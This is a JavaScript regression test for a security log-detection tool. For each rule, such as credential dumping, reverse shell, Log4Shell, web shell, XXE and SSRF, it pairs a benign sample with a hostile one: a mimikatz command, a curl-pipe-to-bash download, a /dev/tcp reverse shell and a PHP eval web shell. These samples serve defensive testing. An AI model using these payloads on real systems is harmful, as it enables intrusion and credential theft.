// Per-rule regression harness: each rule gets a POSITIVE (must fire) and NEGATIVE (must stay quiet).
// Reviewer-2 point #4. Run: node rule_regression.js [work.html]
const fs=require('fs');
const FILE=process.argv[2]||'index.html';
const el=()=>({setAttribute(){},style:{},classList:{add(){},remove(){},contains(){return true}},querySelectorAll:()=>[],parentNode:null,appendChild(){},value:"",innerHTML:"",textContent:"",getContext:()=>({})});
global.document={getElementById:el,querySelectorAll:()=>[],querySelector:el,createElement:el,createElementNS:el,addEventListener(){},body:{appendChild(){}}};
global.window={addEventListener(){}};global.fetch=()=>Promise.reject();global.AbortController=function(){this.abort=()=>{};this.signal={};};global.btoa=s=>Buffer.from(s).toString("base64");global.atob=b=>Buffer.from(b,"base64").toString("binary");global.alert=()=>{};
const sc=fs.readFileSync(FILE,'utf8').match(/<script id="cloudlog-main">([\s\S]*)<\/script>/)[1];
new Function(sc+';globalThis.__RR={runDetections,severityOf};')();
const T=globalThis.__RR;
const ev=(a,raw)=>({action:a, ip:"203.0.113.9", actor:"tester", source:"WAF", raw:raw||{message:a}});
const fires=(a,idPart,raw)=>T.runDetections([ev(a,raw)]).some(x=>((x.rule.id||"")+" "+(x.rule.name||"")).toLowerCase().indexOf(idPart.toLowerCase())>=0);
const flagged=(a,raw)=>T.severityOf(ev(a,raw))!=="info";

// {rule, id-substring, positive sample, negative sample}
const CASES=[
 ["Credential Dumping","T1003","mimikatz.exe privilege::debug sekurlsa::logonpasswords","user requested a password reset via portal"],
 ["PowerShell (enc)","T1059.001","powershell -nop -w hidden -enc SQBFAFgA","powershell Get-Help about_Functions"],
 ["Linux LOLBin","T1059.004","curl http://1.2.3.4/x.sh | bash","curl https://api.internal/health -s"],
 ["SQL Injection","SQL","GET /p?id=1 UNION SELECT username,password FROM users","GET /search?q=select the best product"],
 ["XSS","XSS","GET /c?m=<script>alert(document.cookie)</script>","POST /blog how to write a good script intro"],
 ["Path Traversal/LFI","LFI","GET /?file=../../../../etc/passwd","GET /assets/logo.png"],
 ["SSRF","SSRF","GET /fetch?u=http://169.254.169.254/latest/meta-data/","GET /fetch?u=https://cdn.site.com/a.js"],
 ["Log4Shell","LOG4","GET / User-Agent: ${jndi:ldap://evil/x}","order total was ${amount} dollars"],
 ["Command Injection","CMDI","GET /ping?h=127.0.0.1;cat /etc/passwd","GET /ping?h=127.0.0.1"],
 ["Reverse Shell","REVSHELL","bash -i >& /dev/tcp/10.0.0.5/4444 0>&1","bash -c 'echo hello world'"],
 ["SSTI","SSTI","GET /p?name={{7*7}}${7*7}","GET /p?name=John Smith"],
 ["Web Shell","T1505","POST /up.php <?php eval($_POST['c']); ?>","POST /contact name=Jane message=hi"],
 ["XXE","XXE","POST /api <!DOCTYPE x [<!ENTITY e SYSTEM 'file:///etc/passwd'>]>","POST /api <note><to>Bob</to></note>"],
 ["Scanner UA","SCAN","GET /admin User-Agent: sqlmap/1.6","GET /home User-Agent: Mozilla/5.0 Chrome"],
];
let pass=0,fail=0; const fails=[];
CASES.forEach(c=>{
  const [name,id,pos,neg]=c;
  const p=fires(pos,id); const nf=fires(neg,id);
  if(p) pass++; else { fail++; fails.push(name+": POSITIVE not detected"); }
  if(!nf) pass++; else { fail++; fails.push(name+": NEGATIVE false-fired"); }
});
// severity-level pos/neg (classification, not just rule match)
[["mimikatz sekurlsa::logonpasswords",true],["GET /assets/app.css 200",false],["Failed password from 8.8.8.8",true]].forEach(t=>{
  const got=flagged(t[0]); if(got===t[1]) pass++; else { fail++; fails.push("severity "+JSON.stringify(t[0])+" expected flagged="+t[1]); }
});
console.log("PER-RULE REGRESSION: PASS "+pass+" / FAIL "+fail+"  ("+CASES.length+" rules × pos/neg + 3 severity)");
if(fails.length) fails.forEach(f=>console.log("  ✗ "+f));
process.exit(fail?1:0);
